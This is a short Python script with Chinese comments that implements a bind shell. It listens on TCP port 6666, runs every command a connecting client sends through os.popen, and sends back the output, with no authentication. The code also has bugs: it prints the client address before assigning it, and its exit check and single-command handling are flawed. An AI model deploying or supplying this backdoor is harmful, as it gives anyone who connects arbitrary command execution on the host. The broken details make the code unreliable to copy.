#coding: utf-8
from socket import *
from os import *
from threading import Thread


#创建一个接受服务函数
def ThreadHandle(sock):
	# 接受信息
	cmd = sock.recv(1024)
	# 判断是否为exit
	if cmd == 'exit':
		# 退出
		exit()
	# 执行上面接收到的cmd命令	
	result = popen(cmd).read()
	# 发送执行cmd命令的结果
	sock.send(result)

if __name__ == "__main__":
	# 第一个参数是"服务器之间网络通信", 第二个参数是"流式socket , for TCP"	
	s = socket(AF_INET, SOCK_STREAM)
	# 将套接字绑定到地址，第一个参数是绑定本机，地二个参数是端口号6666
	s.bind(('', 6666))
	# 开始监听传入连接，参数里面的数字表示最大连接数量
	s.listen(1)
	# 设置一个循环
	while True:
		# 接受连接并返回（conn,address）,其中conn是新的套接字对象，可以用来接收和发送数据。address是连接客户端的地址。
		print('Connect by ', addr)
		sock, addr = s.accept()
		# 打印
		print('Connect by ', addr)
		# 生成多线程池
		t = Thread(target = ThreadHandle, args = (sock,))
		# 启动多线程
		t.start()
